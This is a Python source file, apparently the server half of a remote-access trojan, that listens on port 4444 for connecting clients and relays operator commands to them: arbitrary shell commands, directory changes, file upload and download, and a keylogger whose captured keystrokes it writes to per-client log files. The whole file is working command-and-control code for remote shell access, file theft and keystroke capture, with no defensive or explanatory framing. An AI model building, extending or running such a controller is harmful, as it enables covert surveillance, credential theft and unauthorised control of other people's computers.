import socket
import threading
import os

class CommandHandler:
    def __init__(self):
        self.ip_address = '127.0.0.1'
        self.port_number = 4444
        self.threads = []
        self.commands = ["" for _ in range(20)]
        self.answers = ["" for _ in range(20)]
        self.base_dir = './server_data/'  # Base directory for server
        self.client_number = 0

    def handle_upload(self, connection, command, thread_index):
        filename = command.split(" ")[1]
        filepath = os.path.join(self.base_dir, filename)
        if os.path.isfile(filepath):
            with open(filepath, 'rb') as f:
                contents = f.read()
            connection.send(contents)
            self.answers[thread_index] = 'Successful Upload'
        else:
            connection.send("File Not Found".encode())
            self.answers[thread_index] = "File Not Found"

    def handle_download(self, connection, command, thread_index):
        filename = command.split(" ")[1]
        filepath = os.path.join(self.base_dir, filename)
        contents = connection.recv(1024*10000)
        if contents.decode() != "File Not Found":
            with open(filepath, 'wb') as f:
                f.write(contents)
            self.answers[thread_index] = 'Successful Download'
        else:
            self.answers[thread_index] = 'File Not Found'

    def handle_cd(self, connection, command, thread_index):
        answer = connection.recv(1024).decode()
        self.answers[thread_index] = answer

    def handle_bash(self, connection, command, thread_index):
        answer = connection.recv(1024).decode()
        self.answers[thread_index] = answer

    def handle_keylogger(self, connection, command, thread_index):  
        answer = connection.recv(1024).decode()
        if answer.startswith("Pressed keys are"):
            self.answers[thread_index] = "Keylog data is stored"
            filepath = os.path.join(self.base_dir, "Keylog_datas_"+str(self.client_number))
            with open(filepath, 'a') as f:
                f.write(answer)
        elif answer == "Keylogger ON":
            filepath = os.path.join(self.base_dir, "Keylog_datas_"+str(self.client_number))
            self.answers[thread_index] = answer
            if not os.path.isfile(filepath):
                with open(filepath, 'w') as f:
                    pass
        else:
            self.answers[thread_index] = answer 

    def handle_connection(self, connection, thread_index):
        while self.commands[thread_index] != 'quit':
            while self.commands[thread_index] != '':
                command = self.commands[thread_index]
                connection.send(command.encode())

                if command.split(" ")[0] == 'upload':
                    self.handle_upload(connection, command, thread_index)
                elif command.split(" ")[0] == "download":
                    self.handle_download(connection, command, thread_index)
                elif command.split(" ")[0] == "cd":
                    self.handle_cd(connection, command, thread_index)
                elif command.split(" ")[0] == "keylog":
                    self.handle_keylogger(connection, command, thread_index)
                else:
                    self.handle_bash(connection, command, thread_index)

                self.commands[thread_index] = '' #reset input
            
        self.close_connection(connection, thread_index)

    def close_connection(self, connection, thread_index):
        connection.close()
        self.threads[thread_index] = ''
        self.commands[thread_index] = ''
        self.answers[thread_index] = ''

    def server_socket(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.ip_address, self.port_number))
        server_socket.listen(5)
        while True:
            connection, address = server_socket.accept()
            self.client_number+=1
            thread = threading.Thread(target=self.handle_connection, args=(connection, len(self.threads)))
            self.threads.append(thread)
            thread.start()
